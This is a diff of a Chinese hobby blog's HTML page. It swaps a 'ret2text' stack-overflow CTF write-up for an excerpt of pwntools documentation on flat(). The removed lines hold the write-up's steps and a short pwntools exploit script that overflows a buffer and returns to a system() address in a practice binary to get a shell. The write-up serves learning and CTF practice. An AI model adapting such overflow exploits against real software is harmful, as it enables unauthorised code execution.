@@ -4,27 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ret2text, 微凉">
+    <meta name="keywords" content="随笔, 微凉">
     <meta name="description" content="
-首先checksec
-
-运行
-
-拖入IDA
-
-发现危险函数
-
-
-
-
-发现system和bin/sh
-
-
-
-找到s相对于ebp的距离0x6c+4
-
-编写exp
-from pwn import *                       ">
+flat(*args, preprocessor = None, length = None, filler = de_bruijn(),
+Flattens the arguments into a string.
+This functi">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -36,7 +20,7 @@ from pwn import *                       ">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ret2text | 微凉</title>
+    <title>随笔 | 微凉</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -223,12 +207,12 @@ from pwn import *                       ">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ret2text</h1>
+                    <h1 class="description center-align post-title">随笔</h1>
                 </div>
             </div>
         </div>
@@ -344,8 +328,8 @@ from pwn import *                       ">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                                <span class="chip bg-color">栈溢出</span>
+                            <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">
+                                <span class="chip bg-color">知识点</span>
                             </a>
                         
                     </div>
@@ -369,7 +353,7 @@ from pwn import *                       ">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-10
+                    2022-01-14
                 </div>
                 
 
@@ -378,7 +362,7 @@ from pwn import *                       ">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    81
+                    152
                 </div>
                 
 
@@ -404,41 +388,11 @@ from pwn import *                       ">
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <ul>
-<li><p>首先checksec</p>
-<img src="/2022/01/10/ret2text/checksec.png" alt="image-20220110191034015" style="zoom:80%;"></li>
-<li><p>运行</p>
-<img src="/2022/01/10/ret2text/run.png" alt="image-20220110191210204" style="zoom:80%;"></li>
-<li><p>拖入IDA</p>
-<ul>
-<li><p>发现危险函数</p>
-<img src="/2022/01/10/ret2text/function.png" alt="image-20220110191317331" style="zoom:80%;"></li>
-</ul>
+<li><p><strong>flat(*args, preprocessor = None, length = None, filler = de_bruijn(),</strong></p>
+<p>Flattens the arguments into a string.</p>
+<p>This function takes an arbitrary number of arbitrarily nested lists, tuples and dictionaries. It will then find every string and number inside those and flatten them out. Strings are inserted directly while numbers are packed using the <a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.pack"><code>pack()</code></a> function. Unicode strings are UTF-8 encoded.</p>
+<p>Dictionary keys give offsets at which to place the corresponding values (which are recursively flattened). Offsets are relative to where the flattened dictionary occurs in the output (i.e. <code>{0: 'foo'}</code> is equivalent to <code>'foo'</code>). Offsets can be integers, unicode strings or regular strings. Integer offsets &gt;= <code>2**(word_size-8)</code> are converted to a string using <a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.pack"><code>pack()</code></a>. Unicode strings are UTF-8 encoded. After these conversions offsets are either integers or strings. In the latter case, the offset will be the lowest index at which the string occurs in filler. See examples below.</p>
 </li>
-<li><ul>
-<li><p>发现system和bin/sh</p>
-<img src="/2022/01/10/ret2text/system.png" alt="image-20220110191459039" style="zoom:80%;"></li>
-</ul>
-</li>
-<li><p>找到s相对于ebp的距离0x6c+4</p>
-<img src="/2022/01/10/ret2text/s.png" alt="image-20220110194447617" style="zoom: 50%;"></li>
-<li><p>编写exp</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                           
-  2 log_level = 'debug'
-  3 local = 1
-  4 if local:
-  5     r = process("./ret2text")
-  6 else:
-  7     r = remote("")
-  8 elf = ELF("./ret2text")
-  9  
- 10 s = 0x6c + 4
- 11 system_addr = 0x0804863A
- 12  
- 13 payload = b'a'*s+p32(system_addr)
- 14 r.sendline(payload)
- 15  
- 16 r.interactive()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ul>
 
                 
@@ -466,7 +420,7 @@ from pwn import *                       ">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://breeze-666.github.io/2022/01/10/ret2text/">https://breeze-666.github.io/2022/01/10/ret2text/</a>
+                    <a href="https://breeze-666.github.io/2022/01/14/noname/">https://breeze-666.github.io/2022/01/14/noname/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -504,8 +458,8 @@ from pwn import *                       ">
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                                    <span class="chip bg-color">栈溢出</span>
+                                <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">
+                                    <span class="chip bg-color">知识点</span>
                                 </a>
                             
                         </div>
@@ -555,13 +509,13 @@ from pwn import *                       ">
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/01/10/ret2shellcode/">
+                <a href="/2022/01/14/tnt/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="ret2shellcode">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="反应釜开关控制">
                         
-                        <span class="card-title">ret2shellcode</span>
+                        <span class="card-title">反应釜开关控制</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -572,7 +526,7 @@ from pwn import *                       ">
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-10
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-14
                         </span>
                         <span class="publish-author">
                             
@@ -593,6 +547,10 @@ from pwn import *                       ">
                         <span class="chip bg-color">栈溢出</span>
                     </a>
                     
+                    <a href="/tags/xctf/">
+                        <span class="chip bg-color">xctf</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -604,13 +562,13 @@ from pwn import *                       ">
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/10/defcon-2015-r0pbaby/">
+                <a href="/2022/01/14/stack-migrate/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="Defcon-2015-r0pbaby">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="栈迁移">
                         
-                        <span class="card-title">Defcon-2015-r0pbaby</span>
+                        <span class="card-title">栈迁移</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -621,7 +579,7 @@ from pwn import *                       ">
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-14
                             </span>
                         <span class="publish-author">
                             
@@ -638,12 +596,8 @@ from pwn import *                       ">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
-                    </a>
-                    
-                    <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">
-                        <span class="chip bg-color">二进制</span>
+                    <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">
+                        <span class="chip bg-color">知识点</span>
                     </a>
                     
                 </div>
